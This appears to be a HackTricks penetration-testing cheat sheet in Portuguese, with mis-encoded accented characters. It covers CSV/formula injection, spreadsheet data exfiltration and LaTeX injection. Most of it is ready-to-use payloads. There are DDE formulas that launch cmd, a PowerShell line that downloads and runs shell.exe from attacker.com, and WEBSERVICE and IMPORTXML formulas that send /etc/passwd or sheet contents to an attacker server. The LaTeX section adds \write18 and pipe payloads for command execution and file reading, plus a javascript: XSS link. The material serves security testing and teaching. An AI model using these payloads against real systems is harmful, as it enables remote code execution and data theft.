# Inje√ß√£o de F√≥rmula/CSV/Doc/LaTeX/GhostScript

<details>

<summary><strong>Aprenda hacking na AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se voc√™ quiser ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>

**Grupo de Seguran√ßa Try Hard**

<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

***

## Inje√ß√£o de F√≥rmula

### Informa√ß√£o

Se a sua **entrada** est√° sendo **refletida** dentro de **arquivos CSV** (ou qualquer outro arquivo que provavelmente ser√° aberto pelo **Excel**), voc√™ pode ser capaz de inserir **f√≥rmulas do Excel** que ser√£o **executadas** quando o usu√°rio **abrir o arquivo** ou quando o usu√°rio **clicar em algum link** dentro da planilha do excel.

{% hint style="danger" %}
Atualmente, o **Excel ir√° alertar** (v√°rias vezes) o **usu√°rio quando algo √© carregado de fora do Excel** para evitar que ele realize a√ß√µes maliciosas. Portanto, um esfor√ßo especial em Engenharia Social deve ser aplicado ao payload final.
{% endhint %}

### [Wordlist](https://github.com/payloadbox/csv-injection-payloads)
```
DDE ("cmd";"/C calc";"!A0")A0
@SUM(1+9)*cmd|' /C calc'!A0
=10+20+cmd|' /C calc'!A0
=cmd|' /C notepad'!'A1'
=cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0
=cmd|'/c rundll32.exe \\10.0.0.1\3\2\1.dll,0'!_xlbgnm.A1
```
### Hiperlink

**O exemplo a seguir √© muito √∫til para exfiltrar conte√∫do da planilha do Excel final e para fazer solicita√ß√µes para locais arbitr√°rios. Mas requer que o usu√°rio clique no link (e aceite os avisos de alerta).**

O exemplo a seguir foi retirado de [https://payatu.com/csv-injection-basic-to-exploit](https://payatu.com/csv-injection-basic-to-exploit)

Imagine uma viola√ß√£o de seguran√ßa em um sistema de Gerenciamento de Registros de Alunos explorado por meio de um ataque de inje√ß√£o de CSV. A inten√ß√£o principal do atacante √© comprometer o sistema usado pelos professores para gerenciar os detalhes dos alunos. O m√©todo envolve o atacante injetando uma carga maliciosa na aplica√ß√£o, especificamente inserindo f√≥rmulas prejudiciais em campos destinados aos detalhes dos alunos. O ataque se desenrola da seguinte forma:

1. **Inje√ß√£o de Carga Maliciosa:**
* O atacante envia um formul√°rio de detalhes do aluno, mas inclui uma f√≥rmula comumente usada em planilhas (por exemplo, `=HYPERLINK("<malicious_link>","Clique aqui")`).
* Essa f√≥rmula √© projetada para criar um hiperlink, mas aponta para um servidor malicioso controlado pelo atacante.
2. **Exportando Dados Comprometidos:**
* Professores, sem saber da comprometimento, usam a funcionalidade da aplica√ß√£o para exportar os dados para um arquivo CSV.
* O arquivo CSV, quando aberto, ainda cont√©m a carga maliciosa. Essa carga aparece como um hiperlink clic√°vel na planilha.
3. **Desencadeando o Ataque:**
* Um professor clica no hiperlink, acreditando ser uma parte leg√≠tima dos detalhes do aluno.
* Ao clicar, dados sens√≠veis (potencialmente incluindo detalhes da planilha ou do computador do professor) s√£o transmitidos para o servidor do atacante.
4. **Registrando os Dados:**
* O servidor do atacante recebe e registra os dados sens√≠veis enviados do computador do professor.
* O atacante pode ent√£o usar esses dados para v√°rios fins maliciosos, comprometendo ainda mais a privacidade e seguran√ßa dos alunos e da institui√ß√£o.

### RCE

**Confira o** [**post original**](https://notsosecure.com/data-exfiltration-formula-injection-part1) **para mais detalhes.**

Em configura√ß√µes espec√≠ficas ou vers√µes mais antigas do Excel, um recurso chamado Troca Din√¢mica de Dados (DDE) pode ser explorado para executar comandos arbitr√°rios. Para aproveitar isso, as seguintes configura√ß√µes devem estar habilitadas:

* Navegue at√© Arquivo ‚Üí Op√ß√µes ‚Üí Centro de Confian√ßa ‚Üí Configura√ß√µes do Centro de Confian√ßa ‚Üí Conte√∫do Externo e habilite **Iniciar Servidor de Troca Din√¢mica de Dados**.

Quando uma planilha com a carga maliciosa √© aberta (e se o usu√°rio aceitar os avisos), a carga √© executada. Por exemplo, para iniciar o aplicativo da calculadora, a carga seria:
```markdown
`=cmd|' /C calc'!xxx`
```
Comandos adicionais tamb√©m podem ser executados, como baixar e executar um arquivo usando o PowerShell:
```bash
=cmd|' /C powershell Invoke-WebRequest "http://www.attacker.com/shell.exe" -OutFile "$env:Temp\shell.exe"; Start-Process "$env:Temp\shell.exe"'!A1
```
### Inclus√£o Local de Arquivo (LFI) no LibreOffice Calc

O LibreOffice Calc pode ser usado para ler arquivos locais e exfiltrar dados. Aqui est√£o alguns m√©todos:

- Lendo a primeira linha do arquivo local `/etc/passwd`: `='file:///etc/passwd'#$passwd.A1`
- Exfiltrando os dados lidos para um servidor controlado pelo atacante: `=WEBSERVICE(CONCATENATE("http://<IP do atacante>:8080/",('file:///etc/passwd'#$passwd.A1)))`
- Exfiltrando mais de uma linha: `=WEBSERVICE(CONCATENATE("http://<IP do atacante>:8080/",('file:///etc/passwd'#$passwd.A1)&CHAR(36)&('file:///etc/passwd'#$passwd.A2)))`
- Exfiltra√ß√£o DNS (enviando dados lidos como consultas DNS para um servidor DNS controlado pelo atacante): `=WEBSERVICE(CONCATENATE((SUBSTITUTE(MID((ENCODEURL('file:///etc/passwd'#$passwd.A19)),1,41),"%","-")),".<dom√≠nio do atacante>"))`

### Google Sheets para Exfiltra√ß√£o de Dados Out-of-Band (OOB)

O Google Sheets oferece fun√ß√µes que podem ser exploradas para exfiltra√ß√£o de dados OOB:

- **CONCATENATE**: Anexa strings juntas - `=CONCATENATE(A2:E2)`
- **IMPORTXML**: Importa dados de tipos de dados estruturados - `=IMPORTXML(CONCAT("http://<IP do atacante:Porta>/123.txt?v=", CONCATENATE(A2:E2)), "//a/a10")`
- **IMPORTFEED**: Importa feeds RSS ou ATOM - `=IMPORTFEED(CONCAT("http://<IP do atacante:Porta>//123.txt?v=", CONCATENATE(A2:E2)))`
- **IMPORTHTML**: Importa dados de tabelas ou listas HTML - `=IMPORTHTML (CONCAT("http://<IP do atacante:Porta>/123.txt?v=", CONCATENATE(A2:E2)),"table",1)`
- **IMPORTRANGE**: Importa um intervalo de c√©lulas de outra planilha - `=IMPORTRANGE("https://docs.google.com/spreadsheets/d/[ID da Planilha]", "planilha1!A2:E2")`
- **IMAGE**: Insere uma imagem em uma c√©lula - `=IMAGE("https://<IP do atacante:Porta>/images/srpr/logo3w.png")`

## Inje√ß√£o LaTeX

Normalmente, os servidores que voc√™ encontrar√° na internet que **convertem c√≥digo LaTeX em PDF** usam **`pdflatex`**.\
Este programa usa 3 atributos principais para (des)permitir a execu√ß√£o de comandos:

- **`--no-shell-escape`**: **Desabilita** a constru√ß√£o `\write18{comando}`, mesmo que esteja habilitada no arquivo texmf.cnf.
- **`--shell-restricted`**: Igual a `--shell-escape`, mas **limitado** a um conjunto 'seguro' de **comandos pr√©-definidos** (\*\*No Ubuntu 16.04 a lista est√° em `/usr/share/texmf/web2c/texmf.cnf`).
- **`--shell-escape`**: **Habilita** a constru√ß√£o `\write18{comando}`. O comando pode ser qualquer comando de shell. Esta constru√ß√£o normalmente √© desativada por motivos de seguran√ßa.

No entanto, existem outras maneiras de executar comandos, ent√£o para evitar RCE √© muito importante usar `--shell-restricted`.

### Ler arquivo <a href="#read-file" id="read-file"></a>

Voc√™ pode precisar ajustar a inje√ß√£o com wrappers como \[ ou $.
```bash
\input{/etc/passwd}
\include{password} # load .tex file
\lstinputlisting{/usr/share/texmf/web2c/texmf.cnf}
\usepackage{verbatim}
\verbatiminput{/etc/passwd}
```
#### Ler arquivo de uma √∫nica linha
```bash
\newread\file
\openin\file=/etc/issue
\read\file to\line
\text{\line}
\closein\file
```
#### Ler arquivo com v√°rias linhas
```bash
\newread\file
\openin\file=/etc/passwd
\loop\unless\ifeof\file
\read\file to\fileline
\text{\fileline}
\repeat
\closein\file
```
### Escrever arquivo <a href="#write-file" id="write-file"></a>
```bash
\newwrite\outfile
\openout\outfile=cmd.tex
\write\outfile{Hello-world}
\closeout\outfile
```
### Execu√ß√£o de comando <a href="#execu√ß√£o-de-comando" id="execu√ß√£o-de-comando"></a>

A entrada do comando ser√° redirecionada para stdin, use um arquivo tempor√°rio para obt√™-lo.
```bash
\immediate\write18{env > output}
\input{output}

\input{|"/bin/hostname"}
\input{|"extractbb /etc/passwd > /tmp/b.tex"}

# allowed mpost command RCE
\documentclass{article}\begin{document}
\immediate\write18{mpost -ini "-tex=bash -c (id;uname${IFS}-sm)>/tmp/pwn" "x.mp"}
\end{document}

# If mpost is not allowed there are other commands you might be able to execute
## Just get the version
\input{|"bibtex8 --version > /tmp/b.tex"}
## Search the file pdfetex.ini
\input{|"kpsewhich pdfetex.ini > /tmp/b.tex"}
## Get env var value
\input{|"kpsewhich -expand-var=$HOSTNAME > /tmp/b.tex"}
## Get the value of shell_escape_commands without needing to read pdfetex.ini
\input{|"kpsewhich --var-value=shell_escape_commands > /tmp/b.tex"}
```
Se voc√™ receber algum erro LaTex, considere usar base64 para obter o resultado sem caracteres ruins.
```bash
\immediate\write18{env | base64 > test.tex}
\input{text.tex}
```

```bash
\input|ls|base4
\input{|"/bin/hostname"}
```
### Cross Site Scripting <a href="#cross-site-scripting" id="cross-site-scripting"></a>

De [@EdOverflow](https://twitter.com/intigriti/status/1101509684614320130)
```bash
\url{javascript:alert(1)}
\href{javascript:alert(1)}{placeholder}
```
## Inje√ß√£o de Ghostscript

**Verifique** [**https://blog.redteam-pentesting.de/2023/ghostscript-overview/**](https://blog.redteam-pentesting.de/2023/ghostscript-overview/)

## Refer√™ncias

* [https://notsosecure.com/data-exfiltration-formula-injection-part1](https://notsosecure.com/data-exfiltration-formula-injection-part1)
* [https://0day.work/hacking-with-latex/](https://0day.work/hacking-with-latex/)
* [https://salmonsec.com/cheatsheet/latex\_injection](https://salmonsec.com/cheatsheet/latex\_injection)
* [https://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/](https://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/)

**Grupo de Seguran√ßa Try Hard**

<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

<details>

<summary><strong>Aprenda hacking na AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os reposit√≥rios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
